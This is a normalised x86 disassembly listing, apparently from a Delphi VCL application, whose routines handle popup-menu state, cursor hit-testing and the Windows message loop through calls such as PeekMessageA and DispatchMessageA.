mov esi edx
mov ebx eax
xor edi edi
cmp ebx [ esi + 0x4 ]
jne r-xdata
mov eax [ esi + 0x16c ]
call sub_479bb4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edi [ esi + 0x16c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x28c ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x28c ] eax
mov eax ebx
call sub_4700dc
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x1014
call SystemParametersInfoA
mov eax [ ebx + 0x2b0 ]
call sub_42bc74
dec eax
jle r-xdata
cmp [ esi + 0x57 ] 0x0
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_4700dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esp ] 0x0
je r-xdata
mov eax [ ebx + 0x2c4 ]
call sub_4720a0
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x164 ]
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
mov edx [ ebx + 0x28c ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42bc74
mov esi eax
sub esi 0x2
test esi esi
jle r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
mov edx eax
mov ecx esi
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14c ]
mov [ ebx + 0x288 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42bc74
cmp eax 0x2
jne r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8b4
xor eax eax
mov [ ebx + 0x28c ] eax
mov ebp 0x1
jmp r-xdata
mov edx ebp
mov eax [ ebx + 0x2b0 ]
call sub_46f894
xor edx edx
call sub_448ecc
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42bc74
cmp eax 0x2
jg r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
mov edx [ eax ]
call [ edx + 0x17c ]
sub_4707ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x297 ] 0x1
xor ecx ecx
push ebp
push sub_470863
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x150 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47086a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x297 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
call sub_47cf44
test eax eax
je r-xdata
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_470874
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540d8
test al al
je r-xdata
test al al
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x290 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540d8
test al al
jne r-xdata
cmp [ ebx + 0x2a4 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x202
setne al
jmp r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x2a4 ]
call sub_44f7d8
mov edi eax
call GetForegroundWindow
cmp edi eax
jne r-xdata
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al 0x1
mov eax [ ebx + 0x2c4 ]
test eax eax
je r-xdata
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x296 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x4 ] 0xb403
jne r-xdata
mov al 0x1
mov al 0x1
jmp r-xdata
sub_470934
push ebx
add esp 0xffffffe0
mov ebx eax
xor edx edx
mov eax [ ebx + 0x304 ]
call sub_433a38
cmp [ ebx + 0x28c ] 0x0
je r-xdata
add esp 0x20
pop ebx
retn
mov eax [ ebx + 0x28c ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ eax + 0x16c ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_42bc74
dec eax
jle r-xdata
push esp
call GetCursorPos
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
lea ecx [ esp + 0x8 ]
mov edx esp
call sub_448af0
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x18 ]
mov eax [ ebx + 0x28c ]
call sub_44894c
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
mov edx [ ebx + 0x28c ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_46f8a8
mov edx eax
mov ecx [ ebx + 0x28c ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14c ]
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8b4
sub_470a1c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
xor edx edx
mov eax ebx
call sub_47211c
lea eax [ ebx + 0x2f8 ]
call sub_40d31c
xor eax eax
mov [ rw-data ] eax
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov [ ebx + 0x288 ] 0x1
push 0x0
call ShowCaret
lea eax [ ebx + 0x304 ]
call sub_40d31c
lea eax [ ebx + 0x2b0 ]
call sub_40d31c
lea eax [ ebx + 0x300 ]
call sub_40d31c
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_470ab8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x295 ] 0x1
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x294 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_47d448
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov [ eax + 0x295 ] dl
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_470b76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47d41c
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov al [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_47d41c
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
pop edx
call sub_448ecc
inc ebx
dec esi
jne r-xdata
sub_470b84
push esi
mov esi eax
xor edx edx
mov eax [ esi + 0x300 ]
call sub_433a38
mov eax [ esi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
cmp [ eax + 0x294 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x300 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov [ esi + 0x295 ] 0x1
mov eax [ esi + 0x2b0 ]
call sub_46f8a8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x164 ]
mov eax [ esi + 0x2b0 ]
call sub_46f8a8
mov eax [ eax + 0x30c ]
xor edx edx
call sub_46d704
jmp r-xdata
sub_470bf4
push ebx
mov ebx eax
mov eax ebx
call sub_47ddbc
test al al
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
cmp ebx [ ebx + 0x2a8 ]
je r-xdata
mov eax [ ebx + 0x2a8 ]
mov edx [ eax ]
call [ edx + 0x104 ]
sub_470c24
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp + 0x4 ]
mov ecx 0x7
[ edi ] [ esi ]
xor edx edx
mov [ esp ] edx
xor edi edi
mov esi [ eax + 0x2c4 ]
test esi esi
je r-xdata
mov eax [ esp ]
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x2b0 ]
call sub_42bc74
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call WindowFromPoint
mov ebp eax
mov edx ebx
mov eax [ esi + 0x2b0 ]
call sub_46f894
call sub_44f7d8
cmp ebp eax
jne r-xdata
mov [ esp ] edi
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x2b0 ]
call sub_46f894
mov edi eax
push 0x0
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x1c ]
mov eax edi
call sub_448af0
lea edx [ esp + 0x24 ]
mov cl 0x1
mov eax edi
call sub_44d0c4
mov edi eax
sub_470cdc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_480bb8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
pop ebx
retn
sub_470d18
push ebx
push esi
push edi
push ebp
mov esi eax
xor ebp ebp
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
test eax eax
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
mov ebp [ eax + 0x16c ]
jmp r-xdata
sub_470d78
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540c8
mov eax [ esp + 0x4 ]
mov [ ebx + 0x29c ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x2a0 ] eax
xor eax eax
mov [ ebx + 0x2f4 ] eax
mov [ ebx + 0x295 ] 0x0
xor eax eax
mov [ ebx + 0x28c ] eax
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x6a
call SystemParametersInfoA
cmp [ esp ] 0x0
jne r-xdata
mov [ esp ] 0x1
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc [ esp ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4338b0
mov esi eax
mov [ ebx + 0x304 ] esi
push ebx
push sub_470934
mov eax esi
call sub_433a58
mov edx [ esp ]
mov eax [ ebx + 0x304 ]
call sub_433a48
xor edx edx
mov eax [ ebx + 0x304 ]
call sub_433a38
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f858
mov esi eax
mov [ ebx + 0x2b0 ] esi
mov edx ebx
mov eax esi
call sub_46f948
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4338b0
mov esi eax
mov [ ebx + 0x300 ] esi
xor edx edx
mov eax esi
call sub_433a38
mov edx [ ebx + 0x2c0 ]
mov eax esi
call sub_433a48
push ebx
push sub_470b84
mov eax esi
call sub_433a58
mov [ ebx + 0x296 ] 0x1
push 0x0
call HideCaret
mov [ rw-data ] ebx
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
call sub_4607d8
test eax eax
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_470ed0
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
mov eax [ edi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
cmp [ eax + 0x2f8 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ edi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
mov ebx [ eax + 0x2f8 ]
lea eax [ ebx + 0x30c ]
call sub_40d31c
mov [ ebx + 0x294 ] 0x0
mov [ ebx + 0x295 ] 0x0
push 0x96
push 0x32
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov edx ebx
mov eax [ edi + 0x2b0 ]
call sub_46f948
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffb2
call sub_403324
mov ecx edi
mov dl 0x1
call [ eax + 0x2c ]
mov ebx eax
sub_470f64
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_470c24
test eax eax
jne r-xdata
push esi
call DispatchMessageA
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540d8
test al al
je r-xdata
dec eax
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x14 ]
call WindowFromPoint
mov edi eax
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
call sub_44f7d8
cmp edi eax
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
add eax 0xfffffffe
sub eax 0x2
jb r-xdata
mov eax ebx
call sub_4607d8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebx + 0x2c4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ ebx + 0x2c4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
dec eax
sub eax 0x2
jb r-xdata
push 0x1
lea ecx [ esp + 0x4 ]
lea edx [ esi + 0x14 ]
mov eax ebx
call sub_448af0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax edi
call sub_44d0c4
mov edi eax
test edi edi
je r-xdata
jmp r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ ebx + 0x2c4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_471084
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x24 ]
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x16c ]
xor ecx ecx
push ebp
push sub_471366
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_471ed8
cmp [ ebx + 0x4 ] 0x7b
jne r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push ebx
call PeekMessageA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x158 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_470874
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46919c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0x200
jge r-xdata
push ebx
call TranslateMessage
push ebx
call DispatchMessageA
jmp r-xdata
cmp eax 0xb402
jg r-xdata
cmp eax 0xa4
jg r-xdata
sub eax 0xb403
je r-xdata
je r-xdata
sub eax 0xa7
je r-xdata
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x150 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f4 ] eax
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_470518
jmp r-xdata
add eax 0xfffffe00
sub eax 0xb
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
call sub_4720a0
push ebx
call DispatchMessageA
jmp r-xdata
add eax 0xffffffa7
sub eax 0x9
jb r-xdata
sub eax 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4700b0
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x154 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f4 ] eax
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x178 ]
jmp r-xdata
sub eax 0xae16
je r-xdata
cmp [ ebx + 0x8 ] 0x70
jne r-xdata
jmp r-xdata
sub eax 0x91
je r-xdata
push ebx
call TranslateMessage
push ebx
call DispatchMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
call sub_470d18
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebx + 0x4 ] 0x104
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
call sub_470d18
mov eax [ eax + 0x64 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
lea edx [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x12
jne r-xdata
test eax eax
jne r-xdata
call sub_4039a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x1
push ebx
call TranslateMessage
push ebx
call DispatchMessageA
jmp r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_469ac0
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_469b28
jmp r-xdata
call sub_4039a0
jmp r-xdata
sub_471378
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x1 ] al
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_470d18
mov [ esi ] eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ esi ] 0x0
setne al
pop esi
pop ebx
pop ecx
pop ebp
retn
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
mov ebx [ eax ]
call [ ebx + 0xf4 ]
mov [ esi ] eax
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cl 0x1
mov ebx [ eax ]
call [ ebx + 0xf0 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
setne bl
mov eax [ esi ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
jmp r-xdata
sub_471430
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4714ab
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x31 ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4714b2
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47b0b8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
sub_4714b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_471378
pop ecx
test al al
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x8 ]
call sub_47b0a8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_4715d0
jmp r-xdata
call sub_460748
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_46f8a8
mov [ eax + 0x296 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
xor edx edx
mov [ eax + 0x28c ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_470d18
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_470d18
call sub_471430
mov eax [ ebp - 0x8 ]
call sub_471430
mov eax [ ebp - 0x8 ]
call sub_4191a8
push eax
mov eax [ ebp - 0x4 ]
call sub_470d18
pop edx
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
sub_4715e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
cmp bl al
je r-xdata
mov edx ebx
mov eax esi
call sub_47d698
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x17c ]
sub_471610
push esi
push edi
mov esi eax
cmp edx [ esi + 0x2a8 ]
je r-xdata
pop edi
pop esi
retn
mov edi edx
mov [ esi + 0x2a8 ] edi
test edi edi
je r-xdata
mov [ edi + 0x2fc ] esi
mov dl [ edi + 0x248 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov eax [ esi + 0x2a8 ]
cmp [ eax + 0x23a ] 0x0
je r-xdata
mov eax [ esi + 0x2a8 ]
mov al [ eax + 0x289 ]
mov [ esi + 0x289 ] al
mov edx [ eax + 0x238 ]
mov [ esi + 0x238 ] edx
mov edx [ eax + 0x23c ]
mov [ esi + 0x23c ] edx
sub_47167c
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp dl [ ebx + 0x248 ]
setne al
and al dl
mov [ esp ] al
mov eax ebx
call sub_47d9d0
cmp [ esp ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2b0 ] 0x0
je r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42bc74
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax [ ebx + 0x2b0 ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418700
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x138 ]
inc edi
dec esi
jne r-xdata
sub_4716fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x2c4 ] edx
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_47180c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x174 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2f4 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x2f4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2f4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_47b0a8
cmp [ eax + 0x6a ] 0x0
je r-xdata
retn
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_47b320
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_47b0a8
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x160 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
sub_471830
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_471b27
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
call sub_44e694
cmp [ esi + 0x296 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471b2e
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403edc
retn
cmp [ esi + 0x2c4 ] 0x0
je r-xdata
movzx eax [ ebx + 0x4 ]
add eax 0xfffffff3
cmp eax 0x21
ja r-xdata
mov ax [ ebx + 0x4 ]
add al 0xd0
sub al 0xa
jb r-xdata
